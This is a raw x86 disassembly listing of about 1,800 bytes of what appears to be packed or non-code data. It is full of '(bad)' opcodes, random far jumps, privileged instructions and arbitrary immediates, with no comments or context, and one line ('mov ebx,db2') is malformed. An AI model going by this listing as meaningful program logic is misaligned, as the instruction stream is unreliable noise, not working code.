  42bfa9:	add    al,0xc7
  42bfab:	jae    0x42bfaf
  42bfad:	lea    edx,[ebp+0x4b]
  42bfb0:	adc    ebp,eax
  42bfb2:	cmp    bh,BYTE PTR [esi*8+0x292847b0]
  42bfb9:	mov    WORD PTR [edx+0x4b],ds
  42bfbc:	jge    0x42c019
  42bfbe:	nop
  42bfbf:	mov    dl,0x72
  42bfc1:	ret    
  42bfc2:	cdq    
  42bfc3:	pop    esp
  42bfc4:	jbe    0x42c03d
  42bfc6:	mov    ah,0xa6
  42bfc8:	imul   BYTE PTR [esi-0x63]
  42bfcb:	daa    
  42bfcc:	mov    ebx,0x5e276103
  42bfd1:	xchg   DWORD PTR [eax+0x4354f5b2],edx
  42bfd7:	dec    edx
  42bfd8:	(bad)  
  42bfd9:	dec    ecx
  42bfda:	jmp    0xed70:0x63c37a3b
  42bfe1:	outs   dx,BYTE PTR ds:[esi]
  42bfe2:	lods   al,BYTE PTR ds:[esi]
  42bfe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bfe4:	jo     0x42bfba
  42bfe6:	push   ss
  42bfe7:	ins    BYTE PTR es:[edi],dx
  42bfe8:	push   cs
  42bfe9:	imul   eax,DWORD PTR [eax],0x0
  42bfef:	mov    edi,0x3b84f53b
  42bff4:	xchg   esi,eax
  42bff5:	loope  0x42bffb
  42bff7:	cmp    eax,0x913e6f92
  42bffc:	ss mov dh,0x70
  42bfff:	mov    DWORD PTR [edi],esp
  42c001:	and    eax,DWORD PTR [edx+ebx*4]
  42c004:	push   0x9
  42c006:	pop    es
  42c007:	loop   0x42c07b
  42c009:	nop    esp
  42c00c:	sub    eax,0xa7e3e555
  42c011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c012:	das    
  42c013:	xchg   ebx,eax
  42c014:	loop   0x42c00c
  42c016:	dec    edx
  42c017:	push   edi
  42c018:	cmp    ah,ch
  42c01a:	pop    ecx
  42c01b:	xchg   ebp,eax
  42c01c:	xlat   BYTE PTR ds:[ebx]
  42c01d:	dec    esp
  42c01e:	sub    al,0xcb
  42c020:	cld    
  42c021:	adc    ch,cl
  42c023:	adc    al,0x47
  42c025:	stos   DWORD PTR es:[edi],eax
  42c026:	jmp    0x29de:0x1c3fb293
  42c02d:	pop    ebx
  42c02e:	lds    esp,FWORD PTR [edi-0x604a6621]
  42c034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c035:	mul    cl
  42c037:	lea    esi,[edx+0x2a2c620e]
  42c03d:	imul   eax,DWORD PTR ds:0xf6ec357c,0xffffff9f
  42c044:	inc    ebp
  42c045:	adc    ecx,ebp
  42c047:	xchg   ebx,eax
  42c048:	xor    edi,DWORD PTR [ebx+0xd]
  42c04b:	mov    al,ds:0x87defa35
  42c050:	push   eax
  42c051:	adc    ecx,ebp
  42c053:	add    BYTE PTR [eax],al
  42c055:	add    BYTE PTR [eax],al
  42c057:	add    BYTE PTR [ebx-0x63ee25cd],dl
  42c05d:	cmp    esp,ebp
  42c05f:	push   ss
  42c060:	sbb    eax,0x10f132ef
  42c065:	sti    
  42c066:	sbb    ebp,DWORD PTR [ebp-0x40]
  42c069:	cmp    al,0xec
  42c06b:	jmp    0xfadb2412
  42c070:	sbb    al,0xbf
  42c072:	xor    dl,ch
  42c074:	adc    bh,BYTE PTR [esi]
  42c076:	push   cs
  42c077:	pop    edi
  42c078:	push   esp
  42c079:	sub    eax,0x4a44055b
  42c07e:	inc    ebx
  42c07f:	loope  0x42c014
  42c081:	mov    dl,0x92
  42c083:	test   eax,0x918b37
  42c088:	(bad)  
  42c089:	retf   0x8337
  42c08c:	out    dx,al
  42c08d:	mov    bl,0x74
  42c08f:	adc    al,0xf4
  42c091:	jns    0x42c0c5
  42c093:	pop    esp
  42c094:	sahf   
  42c095:	fsubrp st(7),st
  42c097:	adc    eax,0x4ea88d
  42c09c:	jmp    0x17ca:0x398517f9
  42c0a3:	inc    esi
  42c0a4:	clc    
  42c0a5:	clc    
  42c0a6:	les    eax,FWORD PTR [ecx]
  42c0a8:	imul   esi,DWORD PTR [esi+0x565bf523],0x3a12f395
  42c0b2:	xchg   edi,eax
  42c0b3:	je     0x42c102
  42c0b5:	stos   BYTE PTR es:[edi],al
  42c0b6:	xchg   ebx,eax
  42c0b7:	jl     0x42c046
  42c0b9:	sahf   
  42c0ba:	pop    ebx
  42c0bb:	push   0x0
  42c0c0:	add    BYTE PTR [ebp-0x4b],ah
  42c0c3:	push   cs
  42c0c4:	add    BYTE PTR [ebx-0x72b3649c],cl
  42c0ca:	ret    0xcaf6
  42c0cd:	imul   eax,DWORD PTR [eax-0x17],0xffffff8d
  42c0d1:	sub    eax,0xf9000ecb
  42c0d6:	mov    ch,0xd0
  42c0d8:	inc    esp
  42c0d9:	(bad)  
  42c0da:	retf   
  42c0db:	adc    cl,BYTE PTR [ebp-0x3c6c49fb]
  42c0e1:	cmp    BYTE PTR [ecx+0x32],0x1c
  42c0e5:	jl     0x42c14d
  42c0e7:	sbb    DWORD PTR [edx+edi*1-0x15fff14c],eax
  42c0ee:	idiv   DWORD PTR [edx+edx*8]
  42c0f1:	fimul  WORD PTR [ecx+0x3d]
  42c0f4:	rcl    BYTE PTR [ebx],0x38
  42c0f7:	outs   dx,BYTE PTR ds:[esi]
  42c0f8:	mov    ebp,ebp
  42c0fa:	cdq    
  42c0fb:	push   ds
  42c0fc:	pop    ecx
  42c0fd:	inc    edx
  42c0fe:	inc    esp
  42c0ff:	ja     0x42c0f7
  42c101:	shl    BYTE PTR [ebp+0x4c90000e],cl
  42c107:	sti    
  42c108:	mov    WORD PTR [edi+ebp*4],fs
  42c10b:	xor    al,0xef
  42c10d:	jmp    0x42c0f8
  42c10f:	mov    ch,0xa
  42c111:	fisttp WORD PTR [ecx-0x581b76f7]
  42c117:	bound  ecx,QWORD PTR cs:0xf6247c12
  42c11e:	push   edx
  42c11f:	inc    edx
  42c120:	cmp    ebp,edi
  42c122:	cmp    DWORD PTR [edi+0x7b],edx
  42c128:	add    BYTE PTR [eax],al
  42c12a:	mov    ah,0x43
  42c12c:	sub    BYTE PTR [edx+ebp*4],bl
  42c12f:	pop    eax
  42c130:	ins    DWORD PTR es:[edi],dx
  42c131:	xchg   edi,eax
  42c132:	xchg   ecx,eax
  42c133:	dec    ebx
  42c134:	adc    BYTE PTR [ebp+0x3aa48c6],cl
  42c13a:	mov    cl,BYTE PTR [edx-0x8]
  42c13d:	add    eax,0xe8e1c844
  42c142:	pop    ss
  42c143:	dec    edx
  42c144:	adc    BYTE PTR [eax],al
  42c146:	or     ecx,DWORD PTR [edi]
  42c148:	or     al,0x1c
  42c14a:	arpl   WORD PTR [ebp-0x6d],di
  42c14d:	cmp    esi,DWORD PTR [ebp-0x6fffefb5]
  42c153:	js     0x42c14e
  42c155:	ss cmp eax,0x156233fc
  42c15b:	xchg   edx,eax
  42c15c:	adc    DWORD PTR [ebx+edi*2+0x6a00104a],eax
  42c163:	dec    ebp
  42c164:	dec    eax
  42c165:	bound  ecx,QWORD PTR [ecx]
  42c167:	(bad)  
  42c169:	sub    al,0x76
  42c16b:	aam    0x2c
  42c16d:	and    edx,DWORD PTR [edi+0x762854e1]
  42c173:	mov    dh,dl
  42c175:	pop    es
  42c176:	outs   dx,BYTE PTR ds:[esi]
  42c177:	inc    esp
  42c178:	fmul   DWORD PTR [esi+edx*2+0x6004766c]
  42c17f:	(bad)  
  42c180:	dec    esi
  42c181:	and    al,0x78
  42c183:	mov    dl,0xc0
  42c185:	sub    BYTE PTR [edx],dh
  42c187:	jnp    0x42c1b4
  42c189:	cmp    ebx,DWORD PTR [ebx+0x3042e]
  42c18f:	add    BYTE PTR [eax],al
  42c191:	add    BYTE PTR [eax],al
  42c193:	nop
  42c194:	mov    dl,0x4f
  42c196:	or     eax,0x3f5ed038
  42c19b:	ins    BYTE PTR es:[edi],dx
  42c19c:	xchg   BYTE PTR [ebx-0x77],dl
  42c19f:	sar    DWORD PTR [ecx-0xc],1
  42c1a2:	lods   eax,DWORD PTR ds:[esi]
  42c1a3:	fnstcw WORD PTR [ebx+edx*2-0x3d]
  42c1a7:	pop    edi
  42c1a8:	stos   DWORD PTR es:[edi],eax
  42c1a9:	sbb    ecx,DWORD PTR [ecx]
  42c1ab:	dec    eax
  42c1ac:	es xor al,0x2b
  42c1af:	mul    BYTE PTR [edx-0x712c78db]
  42c1b5:	fst    DWORD PTR [ebx-0xe]
  42c1b8:	sub    DWORD PTR [edx],esp
  42c1ba:	and    BYTE PTR [esi-0x5da83cc9],bl
  42c1c0:	repnz cmc 
  42c1c2:	add    al,0x3
  42c1c4:	out    0xd1,eax
  42c1c6:	cmp    edi,DWORD PTR [edi-0x6e961d92]
  42c1cc:	dec    edx
  42c1cd:	sbb    al,0x1d
  42c1cf:	nop
  42c1d0:	mov    dl,0xf4
  42c1d2:	lods   eax,DWORD PTR ds:[esi]
  42c1d3:	out    0xe2,eax
  42c1d5:	dec    edx
  42c1d6:	xchg   DWORD PTR [ebx+0x12],esi
  42c1d9:	test   BYTE PTR [ebx],0x90
  42c1dc:	dec    edx
  42c1dd:	jmp    0x42c198
  42c1df:	or     DWORD PTR [eax],edi
  42c1e1:	jno    0x42c22a
  42c1e3:	lods   al,BYTE PTR ds:[esi]
  42c1e4:	mov    cl,bh
  42c1e6:	add    bl,bh
  42c1e8:	and    DWORD PTR [edx+0x3d],0x877ae28b
  42c1ef:	mov    bl,0xe
  42c1f1:	test   BYTE PTR [ebx],0x90
  42c1f4:	sub    DWORD PTR [edx+0x1f],esi
  42c1fa:	add    BYTE PTR [eax],al
  42c1fc:	lods   al,BYTE PTR ds:[esi]
  42c1fd:	dec    edx
  42c1fe:	dec    eax
  42c1ff:	mov    ecx,0x3f7b37d9
  42c204:	je     0x42c18c
  42c206:	push   cs
  42c207:	div    dh
  42c209:	xchg   ebx,eax
  42c20a:	ret    0x93ea
  42c20d:	mov    dl,0x99
  42c20f:	jne    0x42c279
  42c211:	push   ss
  42c212:	psubsw mm2,QWORD PTR [ebx-0x73ec7936]
  42c219:	mov    dl,0x3e
  42c21b:	sar    edi,0x94
  42c21e:	push   cs
  42c21f:	jmp    0x31a5ba33
  42c224:	add    DWORD PTR [ebx],0x33
  42c227:	popf   
  42c228:	(bad)  
  42c229:	mov    dl,0xe
  42c22b:	outs   dx,BYTE PTR ds:[esi]
  42c22c:	les    edi,FWORD PTR [ebp-0x2f2516f2]
  42c232:	cmp    ch,BYTE PTR [eax+ebx*8-0x72]
  42c236:	cmp    WORD PTR [ecx],dx
  42c239:	sub    esi,DWORD PTR [ebx]
  42c23b:	inc    ecx
  42c23c:	xchg   esp,eax
  42c23d:	mov    dl,0xe
  42c23f:	xchg   ecx,eax
  42c240:	stos   BYTE PTR es:[edi],al
  42c241:	(bad)  
  42c242:	push   cs
  42c243:	jmp    0xcda5b95f
  42c248:	inc    edx
  42c249:	add    esi,DWORD PTR [ebx]
  42c24b:	xchg   ebp,eax
  42c24c:	xchg   edi,eax
  42c24d:	mov    dl,0xe
  42c24f:	jb     0x42c261
  42c251:	xchg   ebx,eax
  42c252:	ret    0x93ea
  42c255:	mov    dl,0x43
  42c257:	bound  ecx,QWORD PTR [ebp-0xbfa7cdb]
  42c25d:	ss in  al,dx
  42c25f:	jmp    0x42c264
  42c264:	add    BYTE PTR [ebp+0x17e53f3b],bh
  42c26a:	neg    DWORD PTR [ebx]
  42c26c:	ins    BYTE PTR es:[edi],dx
  42c26d:	sbb    eax,0x7ee9ec37
  42c272:	mov    ebx,0xc3770132
  42c277:	xor    al,ch
  42c279:	mov    ebx,0x3f9c2c96
  42c27e:	dec    edx
  42c27f:	mov    ah,0x3e
  42c281:	xchg   esp,eax
  42c282:	mov    dl,0x92
  42c284:	add    BYTE PTR [ecx-0x4a39ac46],ch
  42c28a:	or     BYTE PTR ds:0x2e8f458b,0xb2
  42c291:	test   al,0xb7
  42c293:	aad    0xe8
  42c295:	pop    edx
  42c296:	inc    edi
  42c297:	jmp    0x32b9ff9b
  42c29c:	dec    eax
  42c29d:	xor    bh,ah
  42c29f:	xor    ah,BYTE PTR [eax]
  42c2a1:	shl    eax,1
  42c2a3:	adc    BYTE PTR [eax],al
  42c2a5:	test   eax,0x9974ac2e
  42c2aa:	aam    0x2
  42c2ac:	lea    esi,[ebp-0x66a9b576]
  42c2b2:	inc    ecx
  42c2b3:	add    esp,DWORD PTR [edi+esi*2-0xe]
  42c2b7:	push   cs
  42c2b8:	xor    DWORD PTR ds:0x84c09336,0x35
  42c2bf:	pop    ebp
  42c2c0:	push   0xffffff97
  42c2c2:	jge    0x42c2a0
  42c2c4:	pop    ecx
  42c2c5:	add    DWORD PTR [edi+0xffe9],esi
  42c2cb:	add    BYTE PTR [eax],al
  42c2cd:	add    BYTE PTR [ecx],bh
  42c2cf:	xor    ebx,DWORD PTR [eax+0x24]
  42c2d2:	pop    ecx
  42c2d3:	pop    edx
  42c2d4:	dec    eax
  42c2d5:	add    DWORD PTR [ecx],ebp
  42c2d7:	mov    dl,0x99
  42c2d9:	mov    WORD PTR [ebp+0x39ffec26],es
  42c2df:	pop    edx
  42c2e0:	cmp    BYTE PTR [ecx+0x449540bf],0x95
  42c2e7:	mov    ds:0xb23c1499,al
  42c2ec:	push   cs
  42c2ed:	add    cl,bh
  42c2ef:	icebp  
  42c2f0:	cdq    
  42c2f1:	or     al,0xeb
  42c2f3:	mov    dh,0x4f
  42c2f5:	and    al,0xcd
  42c2f7:	test   ch,cl
  42c2f9:	jae    0x42c336
  42c2fb:	mov    ch,0x67
  42c2fd:	and    al,0xe9
  42c2ff:	mov    ah,0x5f
  42c301:	and    al,0x90
  42c303:	aaa    
  42c304:	retf   
  42c305:	std    
  42c306:	frstor [eax+eiz*8+0x223cce7e]
  42c30d:	into   
  42c30e:	sbb    eax,DWORD PTR [esi+0x3ccafcc7]
  42c314:	fisub  WORD PTR [ebp+0x74]
  42c317:	(bad)  
  42c318:	push   ebx
  42c319:	and    al,0x44
  42c31b:	js     0x42c35f
  42c31d:	sti    
  42c31e:	test   ebx,ebp
  42c320:	or     BYTE PTR [eax-0x70],al
  42c323:	enter  0xbd6,0xd
  42c327:	nop
  42c328:	ss pop eax
  42c32a:	sub    dl,BYTE PTR [edi+0x46]
  42c32d:	push   eax
  42c32e:	(bad)  
  42c32f:	pop    esi
  42c330:	pop    esp
  42c331:	adc    al,BYTE PTR [eax]
  42c333:	add    BYTE PTR [eax],al
  42c335:	add    BYTE PTR [eax],al
  42c337:	ror    BYTE PTR [ebx-0x6d],1
  42c33a:	ret    
  42c33b:	mov    esi,ss
  42c33d:	dec    esi
  42c33e:	and    al,0xc8
  42c340:	and    ebp,ebp
  42c342:	add    DWORD PTR [eax-0x537492b5],edx
  42c348:	ret    
  42c349:	adc    al,BYTE PTR [eax]
  42c34b:	nop
  42c34c:	fmul   DWORD PTR [edi]
  42c34e:	call   0xfb23b5f4
  42c353:	sbb    eax,DWORD PTR [edi-0x5bc7efca]
  42c359:	call   0x4f130358
  42c35e:	and    al,0x98
  42c360:	jecxz  0x42c3a2
  42c362:	repnz das 
  42c364:	aam    0x6c
  42c366:	mov    esi,0xca6b523b
  42c36b:	sub    al,bh
  42c36d:	in     eax,0xfa
  42c36f:	pop    ss
  42c370:	cmp    eax,edx
  42c372:	pop    edx
  42c373:	outs   dx,BYTE PTR ds:[esi]
  42c374:	push   ss
  42c375:	pop    ebx
  42c376:	or     esp,0x900011be
  42c37c:	mov    edx,ebp
  42c37e:	call   FWORD PTR [edx+esi*4+0x60]
  42c382:	loopne 0x42c394
  42c384:	inc    esi
  42c385:	mov    dh,0x5
  42c387:	nop
  42c388:	mov    dl,0xa8
  42c38a:	pop    ecx
  42c38b:	inc    ebx
  42c38c:	retf   0x41f
  42c38f:	nop
  42c390:	mov    dl,0xa8
  42c392:	int3   
  42c393:	pop    esi
  42c394:	cmc    
  42c395:	mov    ch,0x84
  42c397:	push   ebx
  42c398:	mov    dl,0x8c
  42c39a:	lock add BYTE PTR [eax],al
  42c39d:	add    BYTE PTR [eax],al
  42c39f:	add    BYTE PTR [edx+edx*8+0x319043c3],ah
  42c3a6:	mov    edx,0x78fbe5ff
  42c3ab:	inc    edi
  42c3ac:	nop
  42c3ad:	enter  0xaaf7,0x58
  42c3b1:	xchg   ebx,eax
  42c3b2:	int    0x15
  42c3b4:	test   al,0x11
  42c3b6:	push   es
  42c3b7:	add    al,0x90
  42c3b9:	and    eax,0x3484c57b
  42c3be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c3bf:	fild   DWORD PTR [edi+0x4f0bd26]
  42c3c5:	add    ebp,DWORD PTR [eax+0x60b29002]
  42c3cb:	shr    DWORD PTR [edi+0x4f],0x59
  42c3cf:	add    edx,DWORD PTR [eax-0x309449d3]
  42c3d5:	enter  0x7ec9,0xdc
  42c3d9:	pop    edx
  42c3da:	pop    es
  42c3db:	push   esp
  42c3dc:	loop   0x42c3bd
  42c3de:	or     cl,dh
  42c3e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c3e1:	cmp    cl,al
  42c3e3:	inc    ebx
  42c3e4:	nop
  42c3e5:	sub    eax,0xcc637136
  42c3ea:	cs push eax
  42c3ec:	int    0x5c
  42c3ee:	retf   0x9eff
  42c3f1:	cmp    ah,dl
  42c3f3:	outs   dx,BYTE PTR ds:[esi]
  42c3f4:	outs   dx,DWORD PTR ds:[esi]
  42c3f5:	jg     0x42c3fe
  42c3f7:	imul   ebx,DWORD PTR [ecx],0x14cbb2df
  42c3fd:	fimul  WORD PTR [esi]
  42c3ff:	jns    0x42c42b
  42c401:	dec    edi
  42c402:	psubsw mm0,QWORD PTR [eax]
  42c405:	add    BYTE PTR [eax],al
  42c407:	add    BYTE PTR [eax],al
  42c409:	xchg   ebx,eax
  42c40a:	dec    edx
  42c40b:	jno    0x42c3d5
  42c40d:	xchg   ebx,eax
  42c40e:	mov    dl,0x99
  42c410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c411:	fninit 
  42c413:	cdq    
  42c414:	mov    esp,0x1dc2d23
  42c419:	pop    es
  42c41a:	adc    eax,0xf41606ed
  42c41f:	sbb    edx,DWORD PTR [ebx+edx*8+0x2f]
  42c423:	iret   
  42c424:	jl     0x42c3e1
  42c426:	test   dh,cl
  42c428:	xchg   esp,ebp
  42c42a:	jae    0x42c3bb
  42c42c:	sub    eax,0xe8fcf994
  42c431:	xchg   ebx,eax
  42c432:	mov    dl,0x99
  42c434:	ins    BYTE PTR es:[edi],dx
  42c435:	shl    BYTE PTR [esi],cl
  42c437:	in     al,dx
  42c438:	into   
  42c439:	adc    al,0x9b
  42c43b:	dec    esi
  42c43c:	xor    BYTE PTR [ecx],cl
  42c43e:	cmp    eax,0xb23c1f4c
  42c443:	inc    edi
  42c444:	mov    al,ds:0xb897e153
  42c449:	sti    
  42c44a:	test   eax,0xaae8b091
  42c44f:	div    al
  42c451:	test   eax,0xb66a0eb2
  42c456:	mov    dl,0x4c
  42c458:	stos   BYTE PTR es:[edi],al
  42c459:	mov    esi,0x997fe483
  42c45e:	bound  edx,QWORD PTR [ecx+0x43b18c25]
  42c464:	bound  ebp,QWORD PTR ds:0xeb1a22be
  42c46a:	mov    edx,0xad90
  42c46f:	add    BYTE PTR [eax],al
  42c471:	add    BYTE PTR [ebx+0x23f4ebe3],dl
  42c477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c478:	dec    esi
  42c479:	jmp    0x6c0172a3
  42c47e:	enter  0xdb2,0x0
  42c482:	dec    esp
  42c483:	popf   
  42c484:	test   BYTE PTR [eax],0xc6
  42c487:	inc    ebx
  42c488:	jmp    0x19fd6e11
  42c48d:	adc    ah,0x5e
  42c490:	push   0x44
  42c492:	stc    
  42c493:	lods   eax,DWORD PTR ds:[esi]
  42c494:	xchg   ebp,eax
  42c495:	xor    eax,0x50309d
  42c49a:	sbb    al,BYTE PTR [ebx+eax*1-0x18]
  42c49e:	fucomi st,st(6)
  42c4a0:	push   cs
  42c4a1:	pop    ebx
  42c4a2:	and    ebp,edi
  42c4a4:	ins    BYTE PTR es:[edi],dx
  42c4a5:	inc    esp
  42c4a6:	mov    ecx,0x158476dc
  42c4ab:	jmp    0x42c4bb
  42c4ad:	(bad)  
  42c4ae:	fmul   QWORD PTR [edx+0x29b9401b]
  42c4b4:	lods   al,BYTE PTR ds:[esi]
  42c4b5:	je     0x42c457
  42c4b7:	mov    bh,0xd3
  42c4b9:	call   0x513a64
  42c4be:	xor    bh,BYTE PTR [edi]
  42c4c0:	xchg   ebx,eax
  42c4c1:	test   ch,0xb8
  42c4c4:	xchg   ebp,eax
  42c4c5:	aaa    
  42c4c6:	or     DWORD PTR [edi-0x984fd0d],esi
  42c4cc:	dec    eax
  42c4cd:	pop    esi
  42c4ce:	sub    cl,BYTE PTR [ebx+0x11faec93]
  42c4d4:	add    dh,dh
  42c4d6:	add    BYTE PTR [eax],al
  42c4d8:	add    BYTE PTR [eax],al
  42c4da:	add    BYTE PTR [esi+eax*1+0x6a],ch
  42c4de:	inc    esp
  42c4df:	imul   esi,DWORD PTR [edi+0x229c8940],0xeb4cf195
  42c4e9:	aas    
  42c4ea:	mov    edi,0x503491
  42c4ef:	sahf   
  42c4f0:	and    DWORD PTR [ebx],eax
  42c4f2:	lock pop ebx
  42c4f4:	jbe    0x42c504
  42c4f6:	idiv   BYTE PTR [esi+eax*1]
  42c4f9:	push   0x44
  42c4fb:	cmp    DWORD PTR [edi+0x73901761],esi
  42c501:	jge    0x42c4fc
  42c503:	pop    ss
  42c504:	adc    DWORD PTR [ebx-0x6ed67b41],0x539ddc24
  42c50e:	add    BYTE PTR [eax+0x12d00e9b],dl
  42c514:	pop    eax
  42c515:	adc    BYTE PTR [ecx],al
  42c517:	inc    edi
  42c518:	fadd   DWORD PTR [esi]
  42c51a:	call   0x5b5320a1
  42c51f:	push   0x1d
  42c521:	(bad)  
  42c522:	dec    esp
  42c523:	in     al,0xb3
  42c525:	and    dh,BYTE PTR [esi+ecx*8+0x20818eb8]
  42c52c:	sbb    al,0x10
  42c52e:	add    BYTE PTR [eax],ch
  42c530:	sbb    eax,0x4b900013
  42c535:	(bad)  
  42c536:	dec    esp
  42c537:	mov    esp,0xa6b38603
  42c53c:	adc    BYTE PTR [esp+eax*2+0x0],ch
  42c540:	add    BYTE PTR [eax],al
  42c542:	add    BYTE PTR [eax],al
  42c544:	pushf  
  42c545:	jne    0x42c55d
  42c547:	push   eax
  42c548:	add    eax,0x2de7eecf
  42c54d:	scas   eax,DWORD PTR es:[edi]
  42c54e:	cld    
  42c54f:	cli    
  42c550:	adc    eax,0xe050fad6
  42c555:	xchg   esi,eax
  42c556:	sub    ebp,esp
  42c558:	push   0x6ff9a52e
  42c55d:	lds    eax,FWORD PTR [esi]
  42c55f:	sti    
  42c560:	frstor [ebx]
  42c562:	sti    
  42c563:	je     0x42c5bd
  42c565:	dec    eax
  42c566:	add    al,0x78
  42c568:	jle    0x42c545
  42c56a:	adc    bh,BYTE PTR [edi+0x54]
  42c56d:	daa    
  42c56e:	ins    DWORD PTR es:[edi],dx
  42c56f:	dec    esp
  42c570:	xor    al,0x43
  42c572:	sub    al,0xb4
  42c574:	ds test al,0x5c
  42c577:	leave  
  42c578:	push   edx
  42c579:	pop    ss
  42c57a:	adc    BYTE PTR [ebp+0x1b],dl
  42c57d:	mov    dl,0x41
  42c57f:	xor    DWORD PTR [ebx],0xcbe0772a
  42c585:	mov    dh,0xf5
  42c587:	add    edx,DWORD PTR [eax]
  42c589:	out    dx,eax
  42c58a:	cdq    
  42c58b:	je     0x42c5e1
  42c58d:	mov    dl,0xf6
  42c58f:	push   eax
  42c590:	bound  ecx,QWORD PTR [ecx+0x2316ca60]
  42c596:	lods   eax,DWORD PTR ds:[esi]
  42c597:	add    al,0xa6
  42c599:	repnz dec esi
  42c59b:	lahf   
  42c59c:	out    dx,eax
  42c59d:	xor    dh,dh
  42c59f:	jle    0x42c5bc
  42c5a1:	(bad)  
  42c5a2:	xchg   ebp,eax
  42c5a3:	add    dl,BYTE PTR [eax+0x1b0db2]
  42c5a9:	add    BYTE PTR [eax],al
  42c5ab:	add    BYTE PTR [eax],al
  42c5ad:	add    al,0x31
  42c5af:	sbb    eax,0xf1d6537f
  42c5b4:	push   ebx
  42c5b5:	invd   
  42c5b7:	jnp    0x42c539
  42c5b9:	jae    0x42c551
  42c5bb:	test   BYTE PTR [ebx],0x90
  42c5be:	sbb    bl,bl
  42c5c0:	in     al,dx
  42c5c1:	stos   BYTE PTR es:[edi],al
  42c5c2:	xor    BYTE PTR [ecx+0x76],ah
  42c5c5:	cwde   
  42c5c6:	aaa    
  42c5c7:	les    esi,FWORD PTR [esi+0x7d]
  42c5ca:	aas    
  42c5cb:	cmp    ch,BYTE PTR [eax]
  42c5cd:	je     0x42c551
  42c5cf:	dec    ebp
  42c5d0:	inc    esp
  42c5d1:	emms   
  42c5d3:	cmc    
  42c5d4:	pop    ebx
  42c5d5:	xchg   ecx,eax
  42c5d6:	mov    dl,0xf5
  42c5d8:	cmp    DWORD PTR [edx-0x3a],0x21
  42c5dc:	adc    eax,edx
  42c5de:	mov    dl,0xa4
  42c5e0:	retf   
  42c5e1:	test   edx,esi
  42c5e3:	mov    bl,0xc3
  42c5e5:	outs   dx,BYTE PTR ds:[esi]
  42c5e6:	mov    BYTE PTR [eax+0x67],bh
  42c5e9:	mov    ah,0x8a
  42c5eb:	cmc    
  42c5ec:	jle    0x42c601
  42c5ee:	xlat   BYTE PTR ds:[ebx]
  42c5ef:	test   DWORD PTR [edx],eax
  42c5f1:	nop
  42c5f2:	mov    dl,0x5
  42c5f4:	jg     0x42c5d1
  42c5f6:	(bad)  
  42c5f7:	or     esp,ebx
  42c5f9:	jne    0x42c5f3
  42c5fb:	push   cs
  42c5fc:	jbe    0x42c622
  42c5fe:	aas    
  42c5ff:	pop    ebx
  42c600:	(bad)
  42c603:	aas    
  42c604:	push   ecx
  42c605:	mov    ah,0xf4
  42c607:	jmp    0x42c667
  42c609:	adc    ch,BYTE PTR [edx]
  42c60b:	mov    ebx,db2
  42c60e:	mov    dl,0x64
  42c610:	mov    ds:0x0,eax
  42c615:	add    BYTE PTR [ecx+0x2f],ch
  42c618:	inc    esp
  42c619:	jo     0x42c69a
  42c61b:	(bad)  
  42c61c:	add    dh,BYTE PTR [edx-0x18]
  42c61f:	add    DWORD PTR [ebx-0x67],0x1327376
  42c626:	inc    esp
  42c627:	push   0xb24f6a4f
  42c62c:	mul    BYTE PTR [ecx+0x75]
  42c62f:	mov    dl,0xe
  42c631:	popa   
  42c632:	dec    edi
  42c633:	(bad)  
  42c634:	call   ecx
  42c636:	mov    eax,0x47217a3
  42c63b:	sbb    BYTE PTR [ebx-0x66d35406],bh
  42c641:	lods   eax,DWORD PTR ds:[esi]
  42c642:	outs   dx,DWORD PTR ds:[esi]
  42c643:	mov    edi,0xb291ffa8
  42c648:	push   cs
  42c649:	je     0x42c673
  42c64b:	shr    DWORD PTR [esi-0x18],cl
  42c64e:	xchg   ebx,eax
  42c64f:	mov    dl,0xd4
  42c651:	call   0x549b37e9
  42c656:	jge    0x42c5e4
  42c658:	dec    esp
  42c659:	and    al,BYTE PTR [edi]
  42c65b:	pop    ss
  42c65c:	dec    edx
  42c65d:	stos   DWORD PTR es:[edi],eax
  42c65e:	nop
  42c65f:	mov    dl,0x1f
  42c661:	test   eax,0xde13290f
  42c666:	add    BYTE PTR [edi+0x79],ch
  42c669:	jmp    0x42c645
  42c66b:	aaa    
  42c66c:	(bad)  
  42c66d:	ficomp DWORD PTR [eax+ebx*8]
  42c670:	mov    esi,0xec673b81
  42c675:	mov    cs,WORD PTR [ebx+0x61]
  42c678:	pop    DWORD PTR [eax]
  42c67a:	add    BYTE PTR [eax],al
  42c67c:	add    BYTE PTR [eax],al
  42c67e:	add    BYTE PTR [ebp-0x54],al
  42c681:	sub    eax,DWORD PTR [eax]
  42c683:	shl    BYTE PTR [edx+0x32],0x18
  42c687:	stos   BYTE PTR es:[edi],al
  42c688:	push   ds
  42c689:	pcmpeqw mm1,mm2
  42c68c:	test   eax,0x8325244f
  42c691:	inc    eax
  42c692:	push   ebx
  42c693:	lods   al,BYTE PTR ds:[esi]
  42c694:	stos   BYTE PTR es:[edi],al
  42c695:	das    
  42c696:	pop    esp
  42c697:	sub    dh,BYTE PTR [ebx-0x2de276f2]
  42c69d:	dec    edx
  42c69e:	add    edi,ecx
  42c6a0:	mov    dl,0xf6
  42c6a2:	mov    bl,0xb7
  42c6a4:	sbb    ebp,ecx
  42c6a6:	mov    eax,ecx
  42c6a8:	xor    ecx,ebp
  42c6aa:	jne    0x42c6a1
  42c6ac:	in     al,0xce
  42c6ae:	jmp    0x42c6c3
  42c6b0:	scas   eax,DWORD PTR es:[edi]
  42c6b1:	pop    edi
  42c6b2:	and    al,0xe5
  42c6b4:	scas   eax,DWORD PTR es:[edi]
  42c6b5:	dec    edi
  42c6b6:	and    al,0xe1
  42c6b8:	or     eax,0x1b9eff74
  42c6bd:	inc    ebx
  42c6be:	mov    ebx,DWORD PTR [ebp+0x28f8f037]
  42c6c4:	or     bl,BYTE PTR [eax+0x4]
  42c6c7:	test   eax,0x32565bb2
  42c6cc:	and    eax,0xcf1d8d41
  42c6d1:	outs   dx,BYTE PTR ds:[esi]
  42c6d2:	add    DWORD PTR [ecx-0x2e256c4e],ebp
  42c6d8:	sub    eax,0xab5eff95
  42c6dd:	dec    edi
  42c6de:	and    al,0x6d
  42c6e0:	adc    BYTE PTR [ebx+0xd6],0x0
  42c6e7:	add    ah,ch
